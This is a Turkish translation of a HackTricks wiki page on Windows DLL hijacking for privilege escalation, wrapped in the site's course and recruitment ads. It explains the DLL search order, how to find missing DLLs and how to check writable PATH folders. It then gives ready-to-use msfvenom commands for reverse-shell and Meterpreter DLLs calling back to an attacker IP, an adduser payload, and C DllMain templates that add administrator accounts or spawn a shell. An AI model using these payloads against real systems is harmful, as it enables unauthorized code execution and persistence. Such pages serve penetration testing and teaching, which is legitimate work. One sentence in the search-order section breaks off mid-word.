# Dll Hijacking

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hackleme kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı bir şekilde Lehçe yazılı ve sözlü dil bilgisi gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü niyetli bir DLL'i yüklemesini sağlamak için manipülasyon yapmayı içerir. Bu terim, **DLL Sahteciliği, Enjeksiyonu ve Yan Yükleme** gibi birkaç taktiği kapsar. Temel olarak, kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada ayrıcalık yükseltmeye odaklanmamıza rağmen, DLL'nin ele geçirilme yöntemi hedeflere bağlı olarak tutarlı kalır.

### Yaygın Teknikler

DLL hijacking için birkaç yöntem kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:

1. **DLL Değiştirme**: Gerçek bir DLL'i kötü niyetli bir DLL ile değiştirme, isteğe bağlı olarak DLL Proxying kullanarak orijinal DLL'in işlevselliğini koruma.
2. **DLL Arama Sırası Kötüye Kullanımı**: Kötü niyetli DLL'i, uygulamanın arama desenini sömürerek, meşru olanın önünde bir arama yoluna yerleştirme.
3. **Hayalet DLL Hijacking**: Bir uygulamanın yüklemesi için gereken olmayan bir DLL olduğunu düşünerek, yüklenmesi için kötü niyetli bir DLL oluşturma.
4. **DLL Yönlendirme**: Arama parametrelerini (%PATH%) veya .exe.manifest / .exe.local dosyalarını değiştirerek uygulamayı kötü niyetli DLL'ye yönlendirme.
5. **WinSxS DLL Değiştirme**: WinSxS dizinindeki meşru DLL'yi kötü niyetli bir karşılıkla değiştirme, genellikle DLL yan yükleme ile ilişkilendirilen bir yöntem.
6. **İlgili Yol DLL Hijacking**: Kötü niyetli DLL'yi, ikili proxy yürütme tekniklerini andıran bir kullanıcı tarafından kontrol edilen bir dizine kopyalanan uygulama ile birlikte yerleştirme.

## Eksik Dll'leri Bulma

Sistem içinde eksik Dll'leri bulmanın en yaygın yolu, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) uygulamasını sysinternals'ten çalıştırmaktır. **Aşağıdaki 2 filtre**'yi **ayarlayarak**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

ve sadece **Dosya Sistemi Etkinliği**'ni gösterin:

![](<../../.gitbook/assets/image (314).png>)

**Genel olarak eksik dll'leri bulmak** için bunu birkaç **saniye** çalıştırabilirsiniz.\
**Belirli bir yürütülebilir içinde eksik bir dll arıyorsanız**, **"Process Name" "contains" "\<exec name>"** gibi **başka bir filtre** ayarlamanız ve etkinlikleri yakalamayı **durdurmanız** gerekmektedir.

## Eksik Dll'leri Sömürme

Ayrıcalıkları yükseltmek için en iyi şansımız, bir ayrıcalık sürecinin **yüklemeye çalışacağı bir dll yazabilmek**. Bunun için, orijinal dll'nin olduğundan **önce aranacak bir klasöre** (garip bir durum) veya dll'nin aranacağı bir klasöre **yazabiliriz** ve orijinal **dll hiçbir klasörde bulunmaz**.

### Dll Arama Sırası

**Microsoft belgeleri içinde** [**Dll'lerin özel olarak nasıl yüklendiğini**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **bulabilirsiniz**.

**Windows uygulamaları**, belirli bir sıraya uyan **önceden tanımlanmış arama yollarını** takip ederek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin stratejik olarak bu dizinlerden birine yerleştirilmesi ve otantik DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemek için uygulamanın DLL'lere başvururken mutlak yolları kullanmasını sağlamak önemlidir.

32-bit sistemlerde **DLL arama sırasını** aşağıda görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu almak için bir işlev yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bu, **App Paths** kaydı tarafından belirtilen uygulama başına yol dahil edilmez. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda **varsayılan** arama sırasıdır. Bu özelliği devre dışı bırakmak için **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkin).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** ile çağrıldığında, arama, **LoadLibraryEx**'in yüklediği yürütülebilir modül dizininde başlar.

Son olarak, **bir dll, sadece adıyla yüklenmiş gibi aranabilir**. Bu durumda, dll **yalnızca o yolda aranacak** (dll'nin bağımlılıkları varsa, sadece adıyla aranacaklar).

Arama sırasını değiştirmenin başka yolları da vardır, ancak bun
#### Windows belgelerindeki dll arama sırasındaki istisnalar

Windows belgelerinde, standart DLL arama sırasına bazı istisnalar belirtilmiştir:

- Bellekte zaten yüklenmiş olan bir DLL ile aynı ismi paylaşan bir DLL ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, DLL'nin bellekte zaten bulunan DLL'ye yönlendirme ve bir manifest kontrolü yapar. Bu senaryoda, sistem DLL için bir arama yapmaz.
- DLL, mevcut Windows sürümü için bir "bilinen DLL" olarak tanınıyorsa, sistem bilinen DLL'nin sürümünü ve bağımlı DLL'lerini kullanır ve arama sürecini atlar. Bu bilinen DLL'lerin listesi, **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarında tutulur.
- Bir DLL'nin bağımlılıkları varsa, bağımlı DLL'lerin araması, başlangıçta DLL'nin tam yolunu belirtilse bile, yalnızca "modül adları" ile gösterildiği gibi yapılır.

### İzinleri Yükseltme

**Gereksinimler**:

- **Farklı ayrıcalıklarla** çalışan veya çalışacak bir işlemi belirleyin (yatay veya yan hareket), **bir DLL eksik** olsun.
- **DLL'nin aranacağı** herhangi bir **dizin** için **yazma erişimi** mevcut olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Evet, gereksinimlerin bulunması zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin eksik bir dll'ye sahip olması tuhaf** ve **sistem yolunda bir klasöre yazma izinlerine sahip olmak daha da tuhaftır** (varsayılan olarak yapamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
Eğer şanslıysanız ve gereksinimleri karşıladığınızı bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin **ana amacı UAC'yi atlatmak** olsa da, yazma izinlerine sahip olduğunuz klasörün yolunu değiştirerek kullanabileceğiniz bir Windows sürümü için bir Dll hijacking PoC'si bulabilirsiniz.

Bir klasördeki izinlerinizi kontrol edebilirsiniz:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca, bir yürütülebilir dosyanın içe aktarımlarını ve bir DLL'nin dışa aktarımlarını kontrol edebilirsiniz:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Ayrıcalıkları yükseltmek için Dll Hijacking'i kötüye kullanma** konusunda tam bir kılavuz için, bir **Sistem Yolu klasörüne yazma izinleri** olan bir klasörde yazma izinlerinizin olup olmadığını kontrol etmek için şu adrese bakın:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Otomatik araçlar

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem YOLU içindeki herhangi bir klasörde yazma izinlerinizin olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonları**'dır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

Sömürülebilir bir senaryo bulduğunuzda, başarıyla sömürmek için en önemli şeylerden biri, **yürütülebilir dosyanın içe aktaracağı tüm işlevleri en azından dışa aktaran bir dll oluşturmaktır**. Her durumda, Dll Hijacking, Orta Bütünlük düzeyinden Yüksek **(UAC'yi atlayarak)**'a veya **Yüksek Bütünlükten SİSTEM**'e [yükselmek için kullanışlıdır](../authentication-credentials-uac-and-efs.md#uac). Dll hijacking için odaklanan bu dll hijacking çalışmasında geçerli bir dll oluşturmanın bir örneğini bu adreste bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde** kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz. Bunlar **şablonlar** veya **gereksiz işlevlere sahip bir dll oluşturmak** için kullanılabilir.

## **Dll Oluşturma ve Derleme**

### **Dll Proxifying**

Temel olarak, bir **Dll proxy**, **yüklenirken kötü niyetli kodunuzu yürütebilen** ancak aynı zamanda **gerçek kütüphaneye tüm çağrıları ileten** ve **beklendiği gibi çalışan** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, **bir yürütülebilir dosya belirtebilir ve proxify yapmak istediğiniz kütüphaneyi seçebilir** ve **proxify edilmiş bir dll oluşturabilirsiniz** veya **Bir Dll belirtebilir ve proxify edilmiş bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Meterpreter elde etme (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluşturma (x86 için x64 sürümünü görmedim):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi Dll'iniz

Unutmayın ki birkaç durumda derlediğiniz Dll, hedef süreç tarafından yüklenecek olan birkaç fonksiyonu **ihraç etmelidir**. Bu fonksiyonlar mevcut değilse, **binary onları yükleyemez** ve **saldırı başarısız olur**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referanslar
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı bir şekilde Lehçe yazılı ve konuşma becerisi gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
